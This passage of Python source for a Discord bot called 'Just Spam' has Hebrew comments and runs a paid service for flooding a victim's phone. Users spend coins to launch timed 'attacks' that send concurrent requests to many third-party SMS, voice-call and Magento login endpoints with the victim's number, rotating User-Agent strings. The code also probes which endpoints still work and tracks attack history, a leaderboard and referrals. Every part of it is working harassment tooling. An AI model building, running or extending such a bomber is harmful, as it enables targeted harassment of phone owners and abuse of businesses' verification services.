        try:
            duration = int(duration)
            if duration < 1 or duration > 60:
                embed = discord.Embed(
                    title="❌ Invalid Duration",
                    description="Duration must be between 1 and 60 minutes",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
        except:
            embed = discord.Embed(
                title="❌ Invalid Duration",
                description="Please enter a valid number",
                color=0xFF0000
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        attack_type = attack_type.lower().strip()
        valid_types = ["all", "sms", "magento", "voice"]
        if attack_type not in valid_types:
            embed = discord.Embed(
                title="❌ Invalid Attack Type",
                description=f"Valid types: {', '.join(valid_types)}",
                color=0xFF0000
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        try:
            intensity = int(intensity)
            if intensity < 1 or intensity > 10:
                intensity = 5
        except:
            intensity = 5
        
        # קבלת נתוני משתמש
        user_data = await users_col.find_one({"user_id": user_id})
        if not user_data:
            user = UserData(user_id, str(interaction.user))
            await users_col.insert_one(user.to_dict())
            user_data = user.to_dict()
        
        # חישוב עלות
        cost = max(1, duration // 5)
        
        if user_data.get("coins", 200) < cost:
            embed = discord.Embed(
                title="❌ Not Enough Coins",
                description=f"You need **{cost}** coins but you only have **{user_data.get('coins', 200)}**",
                color=0xFF0000
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        # הורדת מטבעות
        new_balance = user_data.get("coins", 200) - cost
        await users_col.update_one(
            {"user_id": user_id},
            {
                "$inc": {"coins": -cost, "total_attacks": 1},
                "$set": {"updated_at": datetime.now().isoformat()}
            }
        )
        
        # יצירת אובייקט מתקפה
        attack = AttackData(user_id, phone, duration, attack_type, intensity)
        
        # שמירת מתקפה
        await attacks_col.insert_one(attack.to_dict())
        
        # שמירת טרנזקציה
        transaction = Transaction(user_id, -cost, "attack", f"Attack {duration}min {attack_type}")
        await transactions_col.insert_one(transaction.to_dict())
        
        # שליחת לוג
        logger.info(f"User {interaction.user} started attack: {phone} for {duration}min ({attack_type}) cost: {cost}")
        
        # אמבד אישור
        embed = discord.Embed(
            title="🚀 Attack Launched!",
            description=f"**Phone:** `{phone}`\n**Duration:** `{duration} minutes`\n**Type:** `{attack_type}`\n**Intensity:** `{intensity}/10`\n**Cost:** `{cost}` coins",
            color=0x00FF00,
            timestamp=datetime.now()
        )
        embed.add_field(name="Coins Left", value=f"**{new_balance}**", inline=True)
        embed.add_field(name="Attack ID", value=f"`{attack.attack_id[:8]}`", inline=True)
        embed.set_footer(text=f"Transaction: {transaction.transaction_id}")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # הרצת המתקפה ברקע
        asyncio.create_task(run_attack_function(attack, interaction))
        
    except Exception as e:
        logger.error(f"Error in start_attack_function: {e}")
        traceback.print_exc()
        
        embed = discord.Embed(
            title="❌ Error",
            description="An error occurred. Please try again later.",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית הרצת מתקפה ==========
async def run_attack_function(attack: AttackData, interaction: discord.Interaction):
    """פונקציה להרצת מתקפה"""
    try:
        phone = attack.phone
        phone_formatted = format_phone(phone)
        end_time = datetime.now() + timedelta(minutes=attack.duration)
        
        # בחירת APIs לפי סוג
        if attack.attack_type == "magento":
            apis = MAGENTO_APIS
        elif attack.attack_type == "sms":
            apis = SMS_APIS
        elif attack.attack_type == "voice":
            apis = VOICE_APIS
        else:
            apis = APIS
        
        # חישוב השהיה לפי אינטנסיביות
        delay = 1.0 / (attack.intensity * 2)
        batch_size = max(1, attack.intensity // 2)
        
        logger.info(f"Starting attack {attack.attack_id} with {len(apis)} APIs, delay {delay}s, batch {batch_size}")
        
        async with aiohttp.ClientSession() as session:
            while datetime.now() < end_time:
                # בדיקה אם המתקפה בוטלה
                current_attack = await attacks_col.find_one({"attack_id": attack.attack_id})
                if current_attack and current_attack.get("status") in ["stopped", "failed"]:
                    break
                
                # בחירת APIs אקראיים
                selected_apis = random.sample(apis, min(batch_size * 2, len(apis)))
                
                tasks = []
                for api in selected_apis[:batch_size]:
                    try:
                        if api["type"] == "magento":
                            data = {"type": "login", "telephone": phone}
                            headers = {
                                "User-Agent": random.choice([
                                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                                ]),
                                "Accept": "application/json",
                                "Accept-Language": "he-IL,he;q=0.9",
                                "X-Requested-With": "XMLHttpRequest"
                            }
                            tasks.append(session.post(api["url"], data=data, headers=headers, timeout=3))
                            
                        elif api["type"] in ["json", "form"]:
                            headers = {
                                "User-Agent": random.choice([
                                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                                ]),
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "Accept-Language": "he-IL,he;q=0.9"
                            }
                            
                            data = api.get("data", {}).copy()
                            # החלפת משתנים
                            data_str = json.dumps(data)
                            data_str = data_str.replace("PHONE", phone_formatted)
                            data_str = data_str.replace("PHONE_RAW", phone)
                            data = json.loads(data_str)
                            
                            tasks.append(session.post(api["url"], json=data, headers=headers, timeout=3))
                    except Exception as e:
                        logger.debug(f"Error preparing API {api['name']}: {e}")
                        continue
                
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    success_count = 0
                    for r in results:
                        if isinstance(r, Exception):
                            attack.total_failed += 1
                        elif r.status in [200, 201, 202, 204]:
                            success_count += 1
                            attack.total_success += 1
                        else:
                            attack.total_failed += 1
                        
                        attack.total_sent += 1
                    
                    # עדכון התקדמות
                    attack.progress = ((datetime.now() - (end_time - timedelta(minutes=attack.duration))).total_seconds() / (attack.duration * 60)) * 100
                    
                    # עדכון במסד כל 10 שניות
                    if attack.total_sent % 50 == 0:
                        await attacks_col.update_one(
                            {"attack_id": attack.attack_id},
                            {"$set": {
                                "total_sent": attack.total_sent,
                                "total_success": attack.total_success,
                                "total_failed": attack.total_failed,
                                "progress": attack.progress
                            }}
                        )
                
                await asyncio.sleep(delay)
        
        # סיום המתקפה
        attack.ended_at = datetime.now()
        attack.status = "completed"
        
        await attacks_col.update_one(
            {"attack_id": attack.attack_id},
            {"$set": {
                "ended_at": attack.ended_at.isoformat(),
                "status": "completed",
                "total_sent": attack.total_sent,
                "total_success": attack.total_success,
                "total_failed": attack.total_failed,
                "progress": 100
            }}
        )
        
        logger.info(f"Attack {attack.attack_id} completed. Sent: {attack.total_sent}, Success: {attack.total_success}, Failed: {attack.total_failed}")
        
        # שליחת עדכון למשתמש
        success_rate = (attack.total_success / attack.total_sent * 100) if attack.total_sent > 0 else 0
        
        embed = discord.Embed(
            title="✅ Attack Completed!",
            description=f"**Phone:** `{attack.phone}`\n**Duration:** `{attack.duration} minutes`",
            color=0x00FF00,
            timestamp=attack.ended_at
        )
        embed.add_field(name="📊 Total Sent", value=f"**{attack.total_sent}**", inline=True)
        embed.add_field(name="✅ Success", value=f"**{attack.total_success}**", inline=True)
        embed.add_field(name="❌ Failed", value=f"**{attack.total_failed}**", inline=True)
        embed.add_field(name="📈 Success Rate", value=f"**{success_rate:.1f}%**", inline=True)
        embed.set_footer(text=f"Attack ID: {attack.attack_id[:8]}")
        
        await interaction.followup.send(embed=embed, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in run_attack_function: {e}")
        traceback.print_exc()
        
        attack.status = "failed"
        await attacks_col.update_one(
            {"attack_id": attack.attack_id},
            {"$set": {"status": "failed", "ended_at": datetime.now().isoformat()}}
        )
        
        embed = discord.Embed(
            title="❌ Attack Failed",
            description="An error occurred during the attack",
            color=0xFF0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

# ========== פונקציית בדיקת APIs ==========
async def check_apis_function(interaction: discord.Interaction):
    """פונקציה לבדיקת APIs"""
    await interaction.response.send_message("🔍 **Checking APIs...** This will take a moment", ephemeral=True)
    
    try:
        test_phone = "972501234567"
        test_raw = "0501234567"
        
        working = []
        failed = []
        
        async with aiohttp.ClientSession() as session:
            # בדיקת 20 APIs אקראיים
            apis_to_test = random.sample(APIS, min(20, len(APIS)))
            
            for api in apis_to_test:
                try:
                    if api["type"] == "magento":
                        data = {"type": "login", "telephone": test_raw}
                        headers = {"User-Agent": "Mozilla/5.0"}
                        async with session.post(api["url"], data=data, headers=headers, timeout=2) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                working.append(api["name"])
                                logger.debug(f"API {api['name']} is working")
                            else:
                                failed.append(api["name"])
                    else:
                        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
                        data = api.get("data", {}).copy()
                        # החלפת משתנים
                        data_str = json.dumps(data)
                        data_str = data_str.replace("PHONE", test_phone)
                        data_str = data_str.replace("PHONE_RAW", test_raw)
                        data = json.loads(data_str)
                        
                        async with session.post(api["url"], json=data, headers=headers, timeout=2) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                working.append(api["name"])
                                logger.debug(f"API {api['name']} is working")
                            else:
                                failed.append(api["name"])
                except Exception as e:
                    logger.debug(f"API {api['name']} failed: {e}")
                    failed.append(api["name"])
                
                await asyncio.sleep(0.1)
        
        # יצירת אמבד תוצאות
        embed = discord.Embed(
            title="📊 API Check Results",
            description=f"**Working: {len(working)}/{len(apis_to_test)}**",
            color=0x00FF00 if working else 0xFF0000,
            timestamp=datetime.now()
        )
        
        if working:
            embed.add_field(
                name="✅ Working APIs",
                value="\n".join(working[:10]) + ("..." if len(working) > 10 else ""),
                inline=True
            )
        
        if failed:
            embed.add_field(
                name="❌ Failed APIs",
                value="\n".join(failed[:10]) + ("..." if len(failed) > 10 else ""),
                inline=True
            )
        
        embed.add_field(
            name="📊 Summary",
            value=f"Total APIs: **{len(APIS)}**\nTested: **{len(apis_to_test)}**\nWorking: **{len(working)}**\nFailed: **{len(failed)}**",
            inline=False
        )
        
        embed.set_footer(text=f"ID: {generate_id()}")
        await interaction.followup.send(embed=embed, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in check_apis_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to check APIs",
            color=0xFF0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

# ========== פונקציית סטטיסטיקות ==========
async def show_stats_function(interaction: discord.Interaction):
    """פונקציה להצגת סטטיסטיקות"""
    try:
        total_users = await users_col.count_documents({})
        total_attacks = await attacks_col.count_documents({})
        total_coins = 0
        
        async for user in users_col.find():
            total_coins += user.get("coins", 200)
        
        # סטטיסטיקות של היום
        today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        today_attacks = await attacks_col.count_documents({
            "started_at": {"$gte": today_start.isoformat()}
        })
        
        # סטטיסטיקות של השבוע
        week_start = datetime.now() - timedelta(days=7)
        week_attacks = await attacks_col.count_documents({
            "started_at": {"$gte": week_start.isoformat()}
        })
        
        embed = discord.Embed(
            title="📊 Global Statistics",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(name="👥 Total Users", value=f"**{total_users}**", inline=True)
        embed.add_field(name="💰 Total Coins", value=f"**{total_coins}**", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"**{total_attacks}**", inline=True)
        embed.add_field(name="📅 Today", value=f"**{today_attacks}**", inline=True)
        embed.add_field(name="📆 This Week", value=f"**{week_attacks}**", inline=True)
        embed.add_field(name="📡 APIs", value=f"**{len(APIS)}**", inline=True)
        
        # חלוקה לקטגוריות
        embed.add_field(
            name="📊 API Distribution",
            value=f"🛍️ Fashion: **{len([a for a in APIS if a.get('category') == 'fashion'])}**\n"
                  f"🍔 Food: **{len([a for a in APIS if a.get('category') == 'food'])}**\n"
                  f"📱 Cellular: **{len([a for a in APIS if a.get('category') == 'cellular'])}**\n"
                  f"🏦 Bank: **{len([a for a in APIS if a.get('category') == 'bank'])}**\n"
                  f"🎓 Education: **{len([a for a in APIS if a.get('category') == 'education'])}**",
            inline=False
        )
        
        embed.set_footer(text=f"Uptime: {datetime.now() - bot.start_time}")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in show_stats_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to load statistics",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית לוח מובילים ==========
async def show_leaderboard_function(interaction: discord.Interaction):
    """פונקציה להצגת לוח מובילים"""
    try:
        cursor = users_col.find().sort("coins", -1).limit(10)
        top_users = await cursor.to_list(length=10)
        
        embed = discord.Embed(
            title="🏆 Top 10 Richest Users",
            color=0xFFD700,
            timestamp=datetime.now()
        )
        
        if not top_users:
            embed.description = "No users yet"
        else:
            ranking = ""
            for i, user in enumerate(top_users, 1):
                medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
                
                # נסה למצוא את השם
                try:
                    member = await interaction.guild.fetch_member(int(user["user_id"]))
                    username = member.display_name
                except:
                    username = f"User {user['user_id'][:4]}"
                
                # קבלת מספר מתקפות
                attacks = await attacks_col.count_documents({"user_id": user["user_id"]})
                
                ranking += f"{medal} **{username}** • **{user['coins']}** 💎 • 🎯 {attacks}\n"
            
            embed.description = ranking
        
        # הוספת סטטיסטיקות
        total_users = await users_col.count_documents({})
        embed.add_field(name="Total Users", value=f"**{total_users}**", inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in show_leaderboard_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to load leaderboard",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית הפניות ==========
async def show_referrals_function(interaction: discord.Interaction):
    """פונקציה להצגת הפניות"""
    user_id = str(interaction.user.id)
    
    try:
        user_data = await users_col.find_one({"user_id": user_id})
        
        if not user_data:
            user = UserData(user_id, str(interaction.user))
            await users_col.insert_one(user.to_dict())
            user_data = user.to_dict()
        
        referral_code = user_data.get("referral_code", generate_referral_code())
        referrals = user_data.get("referrals", [])
        
        # חישוב רווחים מהפניות
        total_earned = 0
        for ref_id in referrals:
            ref_user = await users_col.find_one({"user_id": ref_id})
            if ref_user:
                total_earned += 10  # 10 מטבעות לכל הפניה
        
        embed = discord.Embed(
            title="👥 Referral System",
            description="Invite friends and earn coins!",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(name="Your Referral Code", value=f"`{referral_code}`", inline=False)
        embed.add_field(name="Total Referrals", value=f"**{len(referrals)}**", inline=True)
        embed.add_field(name="Coins Earned", value=f"**{total_earned}** 💎", inline=True)
        embed.add_field(
            name="How it works",
            value="• Each referral gives **10 coins**\n"
                  "• Your friend gets **50 coins**\n"
                  "• No limit on referrals",
            inline=False
        )
        
        view = ReferralsView(referral_code)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in show_referrals_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to load referrals",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית היסטוריה ==========
async def show_history_function(interaction: discord.Interaction, page=1):
    """פונקציה להצגת היסטוריה"""
    user_id = str(interaction.user.id)
    
    try:
        cursor = attacks_col.find({"user_id": user_id}).sort("started_at", -1).skip((page-1)*5).limit(5)
        attacks = await cursor.to_list(length=5)
        
        total_attacks = await attacks_col.count_documents({"user_id": user_id})
        total_pages = (total_attacks + 4) // 5
        
        embed = discord.Embed(
            title=f"📜 Attack History (Page {page}/{max(1, total_pages)})",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        
        if not attacks:
            embed.description = "No attacks yet"
        else:
            for attack in attacks:
                status_emoji = {
                    "running": "⚡",
                    "completed": "✅",
                    "stopped": "🛑",
                    "failed": "❌"
                }.get(attack.get("status", "unknown"), "❓")
                
                date = attack["started_at"]
                if isinstance(date, str):
                    try:
                        date = datetime.fromisoformat(date)
                    except:
                        date = datetime.now()
                
                date_str = date.strftime("%d/%m/%Y %H:%M")
                
                embed.add_field(
                    name=f"{status_emoji} {date_str} - {attack.get('attack_type', 'unknown')}",
                    value=f"📱 {attack.get('phone', 'N/A')}\n"
                          f"📊 {attack.get('total_sent', 0)} messages • {attack.get('total_success', 0)} success\n"
                          f"💰 Cost: {attack.get('cost', 0)} coins",
                    inline=False
                )
        
        view = HistoryView(attacks, page) if total_pages > 1 else None
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in show_history_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to load history",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית הגדרות ==========
async def show_settings_function(interaction: discord.Interaction):
    """פונקציה להצגת הגדרות"""
    user_id = str(interaction.user.id)
    
    try:
        user_data = await users_col.find_one({"user_id": user_id})
        
        if not user_data:
            user = UserData(user_id, str(interaction.user))
            await users_col.insert_one(user.to_dict())
            user_data = user.to_dict()
        
        embed = discord.Embed(
            title="⚙️ User Settings",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(name="Language", value=f"**{user_data.get('language', 'he')}**", inline=True)
        embed.add_field(name="Timezone", value=f"**{user_data.get('timezone', 'Asia/Jerusalem')}**", inline=True)
        embed.add_field(name="Notifications", value=f"**{'✅' if user_data.get('notifications', True) else '❌'}**", inline=True)
        embed.add_field(name="Daily Limit", value=f"**{user_data.get('daily_limit', 100)}** attacks", inline=True)
        embed.add_field(name="Rate Limit", value=f"**{user_data.get('rate_limit', 1.0)}**s", inline=True)
        embed.add_field(name="Premium", value=f"**{'✅' if user_data.get('is_premium') else '❌'}**", inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in show_settings_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to load settings",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית מימוש קוד ==========
async def redeem_code_function(interaction: discord.Interaction, code: str):
    """פונקציה למימוש קוד"""
    user_id = str(interaction.user.id)
    
    try:
        code = code.upper().strip()
        
        # בדיקה אם זה קוד הפניה
        referrer = await users_col.find_one({"referral_code": code})
        if referrer and referrer["user_id"] != user_id:
            # בדיקה אם כבר הופנה
            user_data = await users_col.find_one({"user_id": user_id})
            if user_data and user_data.get("referred_by"):
                embed = discord.Embed(
                    title="❌ Already Referred",
                    description="You have already been referred by someone",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            
            # הוספת הפניה
            await users_col.update_one(
                {"user_id": referrer["user_id"]},
                {"$push": {"referrals": user_id}, "$inc": {"coins": 10}}
            )
            
            await users_col.update_one(
                {"user_id": user_id},
                {"$set": {"referred_by": referrer["user_id"]}, "$inc": {"coins": 50}}
            )
            
            embed = discord.Embed(
                title="✅ Referral Code Redeemed!",
                description=f"You got **50** coins!\nReferrer got **10** coins!",
                color=0x00FF00
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        # בדיקה אם זה קופון
        coupon = await coupons_col.find_one({"code": code})
        if coupon and coupon.get("expires_at") > datetime.now():
            if coupon.get("uses", 0) >= coupon.get("max_uses", 1):
                embed = discord.Embed(
                    title="❌ Coupon Expired",
                    description="This coupon has reached its maximum uses",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            
            # מימוש קופון
            amount = coupon.get("amount", 50)
            await users_col.update_one(
                {"user_id": user_id},
                {"$inc": {"coins": amount}}
            )
            
            await coupons_col.update_one(
                {"code": code},
                {"$inc": {"uses": 1}}
            )
            
            embed = discord.Embed(
                title="✅ Coupon Redeemed!",
                description=f"You got **{amount}** coins!",
                color=0x00FF00
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        embed = discord.Embed(
            title="❌ Invalid Code",
            description="The code you entered is invalid",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in redeem_code_function: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to redeem code",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודות בוט ==========

# פקודת !panel
@commands.command(name="panel", aliases=["menu", "spam"])
async def panel_command(ctx):
    """פותח את הפאנל הראשי"""
    user_id = str(ctx.author.id)
    
    try:
        # קבלת נתוני משתמש
        user_data = await users_col.find_one({"user_id": user_id})
        
        if not user_data:
            # משתמש חדש
            user = UserData(user_id, str(ctx.author))
            await users_col.insert_one(user.to_dict())
            coins = 200
        else:
            coins = user_data.get("coins", 200)
        
        # Embed ראשי - Just Spam
        main_embed = discord.Embed(
            title="Just Spam",
            description=f"APP\n{datetime.now().strftime('%m/%d/%Y %I:%M %p')}",
            color=0x2B2D31
        )
        main_embed.add_field(
            name="Just Spam System",
            value="+ **Spam Panel**\n"
                  f"💰 **Your Coins:** {coins}\n"
                  f"📊 **Total APIs:** {len(APIS)}\n"
                  f"🎯 **Magento:** {len(MAGENTO_APIS)}\n"
                  f"📱 **SMS:** {len(SMS_APIS)}\n"
                  f"📞 **Voice:** {len(VOICE_APIS)}",
            inline=False
        )
        main_embed.add_field(
            name="Start Spamming Easily",
            value="Click the button below to begin using the spam system.\n\n⚠️ Make sure you have enough coins before starting.",
            inline=False
        )
        main_embed.set_footer(text=f"Just Spam © 2026 • Spam System • {datetime.now().strftime('%m/%d/%Y %I:%M %p')}")
        
        # Embed שני - Free Coins
        free_embed = discord.Embed(
            title="Just Spam | Free Coins",
            description="**Free Coins**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
            color=0xFFD700
        )
        free_embed.add_field(name="Your Balance", value=f"**{coins}** coins", inline=True)
        free_embed.set_footer(text="👤 Just Spam © 2026")
        
        view = SpamPanelView()
        await ctx.send(embeds=[main_embed, free_embed], view=view)
        
        # לוג
        logger.info(f"User {ctx.author} opened panel. Balance: {coins}")
        
    except Exception as e:
        logger.error(f"Error in panel_command: {e}")
        await ctx.send("❌ An error occurred. Please try again later.")

# פקודת !freecoins
@commands.command(name="freecoins", aliases=["free", "claim"])
async def freecoins_command(ctx):
    """פותח את פאנל המטבעות החינמיים"""
    try:
        embed = discord.Embed(
            title="Just Spam | Free Coins",
            description="**Free Coins**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
            color=0xFFD700
        )
        embed.set_footer(text="👤 Just Spam © 2026")
        
        view = FreeCoinView()
        await ctx.send(embed=embed, view=view)
        
    except Exception as e:
        logger.error(f"Error in freecoins_command: {e}")
        await ctx.send("❌ An error occurred. Please try again later.")

# פקודת !balance
@commands.command(name="balance", aliases=["bal", "coins"])
async def balance_command(ctx):
    """בודק כמה מטבעות יש למשתמש"""
    user_id = str(ctx.author.id)
    
    try:
        user_data = await users_col.find_one({"user_id": user_id})
        
        if not user_data:
            coins = 200
        else:
            coins = user_data.get("coins", 200)
        
        embed = discord.Embed(
            title="💰 Your Balance",
            description=f"You have **{coins}** coins",
            color=0x00FF00
        )
        
        if user_data and user_data.get("last_claim"):
            last_claim = user_data["last_claim"]
            if isinstance(last_claim, str):
                try:
                    last_claim = datetime.fromisoformat(last_claim)
                except:
                    last_claim = None
            
            if last_claim:
                next_claim = last_claim + timedelta(hours=24)
                if next_claim > datetime.now():
                    remaining = next_claim - datetime.now()
                    hours = remaining.seconds // 3600
                    minutes = (remaining.seconds % 3600) // 60
                    embed.add_field(name="Next Free Coin", value=f"**{hours}h {minutes}m**", inline=False)
        
        # סטטיסטיקות
        attacks = await attacks_col.count_documents({"user_id": user_id})
        embed.add_field(name="Total Attacks", value=f"**{attacks}**", inline=True)
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        logger.error(f"Error in balance_command: {e}")
        await ctx.send("❌ An error occurred. Please try again later.")

# פקודת !referrals
@commands.command(name="referrals", aliases=["ref", "invite"])
async def referrals_command(ctx):
    """מציג את מערכת ההפניות"""
    await show_referrals_function(ctx)

# פקודת !history
@commands.command(name="history", aliases=["hist"])
async def history_command(ctx):
    """מציג היסטוריית מתקפות"""
    await show_history_function(ctx)

# פקודת !stop
@commands.command(name="stop", aliases=["cancel"])
async def stop_command(ctx):
    """עוצר את כל המתקפות של המשתמש"""
    user_id = str(ctx.author.id)
    
    try:
        # מציאת כל המתקפות הפעילות
        active_attacks = await attacks_col.find({
            "user_id": user_id,
            "status": "running"
        }).to_list(length=10)
        
        if not active_attacks:
            await ctx.send("❌ No active attacks found")
            return
        
        # עצירת המתקפות
        for attack in active_attacks:
            await attacks_col.update_one(
                {"attack_id": attack["attack_id"]},
                {"$set": {"status": "stopped", "ended_at": datetime.now().isoformat()}}
            )
        
        await ctx.send(f"✅ Stopped **{len(active_attacks)}** active attacks")
        
    except Exception as e:
        logger.error(f"Error in stop_command: {e}")
        await ctx.send("❌ An error occurred. Please try again later.")

# פקודת !stats (לכולם)
@commands.command(name="stats")
async def stats_command(ctx):
    """מציג סטטיסטיקות כלליות"""
    await show_stats_function(ctx)

# פקודת !leaderboard (לכולם)
@commands.command(name="leaderboard", aliases=["top", "lb"])
async def leaderboard_command(ctx):
    """מציג לוח מובילים"""
    await show_leaderboard_function(ctx)

# פקודת !help
@commands.command(name="help", aliases=["commands", "cmd"])
async def help_command(ctx):
    """מציג עזרה"""
    embed = discord.Embed(
        title="❓ Just Spam Commands",
        description="Here are all available commands:",
        color=0x5865F2
    )
    embed.add_field(
        name="📋 General Commands",
        value="`!panel` - Open main panel\n"
              "`!freecoins` - Claim free coins\n"
              "`!balance` - Check your balance\n"
              "`!referrals` - Referral system\n"
              "`!history` - Attack history\n"
              "`!stats` - Global statistics\n"
              "`!leaderboard` - Top users\n"
              "`!stop` - Stop all attacks",
        inline=False
    )
    embed.add_field(
        name="💎 How to get coins",
        value="• Free coins every 24 hours\n"
              "• Refer friends (10 coins each)\n"
              "• Use coupon codes\n"
              "• Purchase from admins",
        inline=False
    )
    embed.set_footer(text="Just Spam © 2026")
    await ctx.send(embed=embed)

# פקודות אדמין
@commands.command(name="addcoins")
@commands.has_permissions(administrator=True)
async def addcoins_command(ctx, user: discord.User, amount: int):
    """מוסיף מטבעות למשתמש (אדמין בלבד)"""
    if amount <= 0:
        await ctx.send("❌ Amount must be positive")
        return
    
    user_id = str(user.id)
    
    try:
        # עדכון מטבעות
        await users_col.update_one(
            {"user_id": user_id},
            {"$inc": {"coins": amount}},
            upsert=True
        )
        
        # שמירת טרנזקציה
        transaction = Transaction(user_id, amount, "admin", f"Added by {ctx.author}")
        await transactions_col.insert_one(transaction.to_dict())
        
        # קבלת יתרה חדשה
        user_data = await users_col.find_one({"user_id": user_id})
        new_balance = user_data.get("coins", 200) if user_data else amount
        
        embed = discord.Embed(
            title="✅ Coins Added",
            description=f"Added **{amount}** coins to {user.mention}",
            color=0x00FF00
        )
        embed.add_field(name="New Balance", value=f"**{new_balance}**", inline=True)
        embed.set_footer(text=f"Transaction: {transaction.transaction_id}")
        
        await ctx.send(embed=embed)
        
        # לוג
        logger.info(f"Admin {ctx.author} added {amount} coins to {user}")
        
    except Exception as e:
        logger.error(f"Error in addcoins_command: {e}")
        await ctx.send("❌ An error occurred")

@commands.command(name="removecoins")
@commands.has_permissions(administrator=True)
async def removecoins_command(ctx, user: discord.User, amount: int):
    """מוריד מטבעות ממשתמש (אדמין בלבד)"""
    if amount <= 0:
        await ctx.send("❌ Amount must be positive")
        return
    
    user_id = str(user.id)
    
    try:
        # עדכון מטבעות
        await users_col.update_one(
            {"user_id": user_id},
            {"$inc": {"coins": -amount}}
        )
        
        # שמירת טרנזקציה
        transaction = Transaction(user_id, -amount, "admin", f"Removed by {ctx.author}")
        await transactions_col.insert_one(transaction.to_dict())
        
        # קבלת יתרה חדשה
        user_data = await users_col.find_one({"user_id": user_id})
        new_balance = user_data.get("coins", 200) if user_data else 0
        
        embed = discord.Embed(
            title="✅ Coins Removed",
            description=f"Removed **{amount}** coins from {user.mention}",
            color=0xFFA500
        )
        embed.add_field(name="New Balance", value=f"**{new_balance}**", inline=True)
        
        await ctx.send(embed=embed)
        
        # לוג
        logger.info(f"Admin {ctx.author} removed {amount} coins from {user}")
        
    except Exception as e:
        logger.error(f"Error in removecoins_command: {e}")
        await ctx.send("❌ An error occurred")

@commands.command(name="createcoupon")
@commands.has_permissions(administrator=True)
async def createcoupon_command(ctx, amount: int, max_uses: int = 1):
    """יוצר קופון (אדמין בלבד)"""
    try:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        
        coupon = {
            "code": code,
            "amount": amount,
            "max_uses": max_uses,
            "uses": 0,
            "created_by": str(ctx.author.id),
            "created_at": datetime.now(),
            "expires_at": datetime.now() + timedelta(days=30)
        }
        
        await coupons_col.insert_one(coupon)
        
        embed = discord.Embed(
            title="✅ Coupon Created",
            description=f"Code: `{code}`\nAmount: **{amount}** coins\nMax Uses: **{max_uses}**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        logger.error(f"Error in createcoupon_command: {e}")
        await ctx.send("❌ An error occurred")

@commands.command(name="ban")
@commands.has_permissions(administrator=True)
async def ban_command(ctx, user: discord.User):
    """חוסם משתמש (אדמין בלבד)"""
    user_id = str(user.id)
    
    try:
        await users_col.update_one(
            {"user_id": user_id},
            {"$set": {"is_banned": True}}
        )
        
        embed = discord.Embed(
            title="✅ User Banned",
